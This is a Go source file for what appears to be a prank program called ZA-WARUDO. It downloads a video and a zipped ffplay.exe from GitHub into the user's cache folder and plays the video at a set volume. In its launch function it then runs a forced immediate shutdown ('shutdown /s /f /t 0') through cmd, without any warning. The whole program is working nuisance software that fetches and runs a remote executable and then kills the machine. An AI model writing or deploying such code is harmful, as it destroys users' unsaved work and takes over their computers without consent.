package main

import (
	"archive/zip"
	"fmt"
	"github.com/dustin/go-humanize"
	"github.com/itchyny/volume-go"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// WriteCounter counts the number of bytes written to it. It implements to the io.Writer interface
// and we can pass this into io.TeeReader() which will report progress on each write cycle.
type WriteCounter struct {
	Total uint64
}

func (wc *WriteCounter) Write(p []byte) (int, error) {
	n := len(p)
	wc.Total += uint64(n)
	wc.PrintProgress()
	return n, nil
}

func (wc WriteCounter) PrintProgress() {
	fmt.Printf("\r%s", strings.Repeat(" ", 35))
	fmt.Printf("\rDownloading... %s", humanize.Bytes(wc.Total))
}

func main() {
	println("Starting...")
	dir, err := os.UserCacheDir()
	if err != nil {
		return
	}

	path := dir + "\\ZA-WARUDO"

	err = os.Mkdir(path, os.ModePerm)
	if err != nil {
		println("launching the video")
		launch(path, path+"\\video")
	} else {
		println("downloading resources")
		downloadAll(path)
	}

	println("End")
}

func downloadAll(path string) {
	videoPath, err := downloadFile(path, "https://github.com/Pronicio/ZA-WARUDO/raw/main/resources/video.mp4", "video", "mp4")
	if err != nil {
		println("Failed to download the video :", err)
	} else {
		println("videoPath", videoPath)
	}

	zipPath, err := downloadFile(path, "https://github.com/Pronicio/ZA-WARUDO/raw/main/resources/ffplay.zip", "ffplay", "zip")
	if err != nil {
		println("Failed to download the video :", err)
	} else {
		println("zipPath", zipPath)
		err := extractZip(zipPath, path)
		if err != nil {
			return
		}
	}

	launch(path, videoPath)
}

func downloadFile(filepath string, url string, filename string, filetype string) (string, error) {

	// Create the file
	out, err := os.Create(filepath + "\\" + filename)
	if err != nil {
		println(err)
	}

	defer out.Close()

	// Get the data
	res, err := http.Get(url)
	if err != nil {
		return "null", err
	}

	defer res.Body.Close()

	// Check server response
	if res.StatusCode != http.StatusOK {
		return "null", fmt.Errorf("bad status: %s", res.Status)
	}

	// Writer the body to file
	counter := &WriteCounter{}
	if _, err = io.Copy(out, io.TeeReader(res.Body, counter)); err != nil {
		return "null", err
	}

	fmt.Print("\n")
	return out.Name(), nil
}

func extractZip(src, dest string) error {
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer func() {
		if err := r.Close(); err != nil {
			panic(err)
		}
	}()

	os.MkdirAll(dest, 0755)

	// Closure to address file descriptors issue with all the deferred .Close() methods
	extractAndWriteFile := func(f *zip.File) error {
		rc, err := f.Open()
		if err != nil {
			return err
		}
		defer func() {
			if err := rc.Close(); err != nil {
				panic(err)
			}
		}()

		path := filepath.Join(dest, f.Name)

		// Check for ZipSlip (Directory traversal)
		if !strings.HasPrefix(path, filepath.Clean(dest)+string(os.PathSeparator)) {
			return fmt.Errorf("illegal file path: %s", path)
		}

		if f.FileInfo().IsDir() {
			os.MkdirAll(path, f.Mode())
		} else {
			os.MkdirAll(filepath.Dir(path), f.Mode())
			f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return err
			}
			defer func() {
				if err := f.Close(); err != nil {
					panic(err)
				}
			}()

			_, err = io.Copy(f, rc)
			if err != nil {
				return err
			}
		}
		return nil
	}

	for _, f := range r.File {
		err := extractAndWriteFile(f)
		if err != nil {
			return err
		}
	}

	return nil
}

func launch(dir string, videoPath string) {
	volume.SetVolume(50)
	if err := exec.Command("cmd", "/C", dir+"\\"+"ffplay.exe", videoPath, "-autoexit").Run(); err != nil {
		println("Failed :", err)
	}
	if err := exec.Command("cmd", "/C", "shutdown", "/s", "/f", "/t", "0").Run(); err != nil {
		println("Failed to initiate shutdown :", err)
	}
}
